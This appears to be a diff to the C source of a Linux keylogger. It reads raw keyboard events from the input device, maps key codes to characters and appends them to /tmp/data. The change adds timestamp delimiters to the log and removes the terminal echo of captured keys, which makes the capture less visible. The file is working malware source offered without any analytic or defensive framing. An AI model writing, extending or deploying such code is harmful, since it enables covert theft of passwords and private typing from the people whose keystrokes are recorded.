@@ -13,11 +13,13 @@
 #include <stdlib.h>
 #include <string.h>
 #include <regex.h>
+#include <time.h>
 
 #define LOGFILE "/tmp/data"
 
 char* set_input();
 void log_r(const char *driver);
+void delimit(FILE *fp);
 
 int main(int argc, char **argv) {
 
@@ -54,8 +56,8 @@ char* set_input() {
   const char *s = "keyboard";
   char buf[500]; // tmp
 
-  while( fgets(buf, 500, fptr) ) {
-
+  while( fgets(buf, 500, fptr) ) 
+    {
     char *ret = strstr(buf, s);
     if(ret) {
 
@@ -72,6 +74,9 @@ char* set_input() {
 	  }
 	}
       }
+
+      
+      
       strcat(driver, tmp);
 
     }
@@ -86,12 +91,20 @@ void log_r(const char *driver) {
   FILE *fp = fopen(LOGFILE, "a");
 
   char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
- 
-  while(1 == 1) {
+
+  while(1) {
+
+    time_t before = clock();
     
     read(fd, &ev, sizeof(ev));
     if((ev.type == EV_KEY) && (ev.value == 0)) {
 
+      // split log file with current time
+      time_t diff = clock() - before;
+      
+      if(diff > 10)
+	delimit(fp);
+      
       switch(ev.code) {
       case(0):
 	fprintf(fp, "KEY_RESERVED");
@@ -116,13 +129,25 @@ void log_r(const char *driver) {
 	break;
       default:
 	fprintf(fp, "%c\n", map[ev.code]);
-	printf("%c\n", map[ev.code]);
       }
     }
-    
+    before = clock();
+
   }
 
   fclose(fp);
   close(fd);
   
+}
+
+void delimit(FILE *fp) {
+
+  time_t rawtime;
+  struct tm * timeinfo;
+
+  time ( &rawtime );
+  timeinfo = localtime ( &rawtime );
+  fprintf (fp, "[%s", asctime (timeinfo) );
+  fprintf(fp, "]\n");
+
 }
